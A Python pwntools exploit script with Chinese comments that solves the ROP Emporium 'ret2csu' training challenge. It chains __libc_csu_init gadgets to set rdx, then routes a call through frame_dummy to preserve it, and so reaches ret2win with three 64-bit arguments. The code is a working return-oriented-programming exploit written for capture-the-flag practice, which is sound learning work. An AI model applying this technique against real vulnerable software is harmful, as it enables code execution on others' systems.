#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ROP Emporium "ret2csu" —— 用 __libc_csu_init 的通用 gadget 补出 rdx

题目：64 位 ELF（No PIE / NX / 无 canary / Partial RELRO），主程序自身几乎
      没有 gadget，真正的 `pwnme` / `ret2win` 在配套的 libret2csu.so 里。
      目标是 `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`，
      三个参数全部按 64 位比较（`movabs rax, 0xdeadbeefdeadbeef` + `cmp QWORD`）。

本题的难点（也是这个题型唯一的坑）：
  * 只有 `pop rdi ; ret`（0x4006a3）和 `pop rsi ; pop r15 ; ret`（0x4006a1），
    **没有 `pop rdx`**；
  * `__libc_csu_init` 的 0x400680 处有 `mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d
    ; call [r12+rbx*8]` —— rdx 有了，但 `mov edi, r13d` 是 **32 位写**，会把
    rdi 的高 32 位清零，所以不能直接用它来 call ret2win（那会把 rdi 变成
    0x00000000deadbeef，第一项检查就挂）。

解法：把 csu 的 `call [r12+rbx*8]` 指向一个"无害且不碰 rdx"的函数指针，
让整段 gadget 安全跑完并走完 epilogue，rdx 活下来；之后再用 pop 补 rdi / rsi，
最后 `ret` 到 `ret2win@plt`。
  无害目标选 `.init_array[0]` = frame_dummy（0x600df0，内容 0x400600）：
  frame_dummy -> register_tm_clones 全程只用 rax/rsi/rdi/rbp，**不动 rdx**，
  末尾 `pop rbp ; ret` 正好返回 0x40068d 继续走 csu 的收尾。

链：
  [40B pad] csu_pop(rbx=0, rbp=1, r12=&frame_dummy, r13=0, r14=0, r15=0xd00d..)
  -> csu_call: rdx=r15, rsi=0, edi=0, call frame_dummy; epilogue 吃掉 7 个 qword
  -> pop rdi ; 0xdeadbeefdeadbeef
  -> pop rsi ; pop r15 ; 0xcafebabecafebabe, 0
  -> ret2win@plt（GOT 懒绑定，第一次跳会由 PLT 自己解析，不影响参数）
"""

import os
import sys

from pwn import *

context(os="linux", arch="amd64", log_level="info")

os.chdir(os.path.dirname(os.path.abspath(__file__)))
BIN = "./ret2csu"

HOST = os.getenv("HOST", "")                # 官方无公开远程：默认只跑本地
PORT = int(os.getenv("PORT", "0"))

# ---- gadget ----
POP_RDI = 0x4006A3          # pop rdi ; ret            (藏在 csu 的 pop 序列里)
POP_RSI_R15 = 0x4006A1      # pop rsi ; pop r15 ; ret
CSU_POP = 0x40069A          # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x400680         # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

# ---- 无害的 call 目标 ----
INIT_ARRAY0 = 0x600DF0      # .init_array[0] -> 0x400600 (frame_dummy)，不碰 rdx
RET2WIN_PLT = 0x400510      # ret2win@plt

# ---- ret2win 期望的参数（64 位）----
ARG1 = 0xDEADBEEFDEADBEEF
ARG2 = 0xCAFEBABECAFEBABE
ARG3 = 0xD00DF00DD00DF00D

OFFSET = 0x20 + 8           # pwnme: read(0, rbp-0x20, 0x200)


def start() -> tube:
    if args.LOCAL or not HOST:
        return process(BIN)
    return remote(HOST, PORT)


def build() -> bytes:
    chain = flat(
        b"A" * OFFSET,
        CSU_POP,
        0,                      # rbx = 0  -> call [r12]
        1,                      # rbp = 1  -> 循环一轮后退出
        INIT_ARRAY0,            # r12 = &frame_dummy
        0,                      # r13 -> edi = 0
        0,                      # r14 -> rsi = 0
        ARG3,                   # r15 -> rdx = 0xd00d...   <-- 本题唯一能设 rdx 的地方
        CSU_CALL,
        # epilogue: add rsp,8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        *([0] * 7),
        # rdx 已就位，之后只碰 rdi / rsi，rdx 保持不变
        POP_RDI, ARG1,
        POP_RSI_R15, ARG2, 0,
        RET2WIN_PLT,
    )
    return chain


def main():
    p = start()
    p.recvuntil(b"> ")
    p.send(build())
    out = p.recvrepeat(3)
    p.close()

    text = out.decode("utf-8", "ignore")
    print(text)
    if "ROPE" in text:
        log.success("got flag line above")
    else:
        log.failure("no flag, check gadgets/args")


if __name__ == "__main__":
    main()
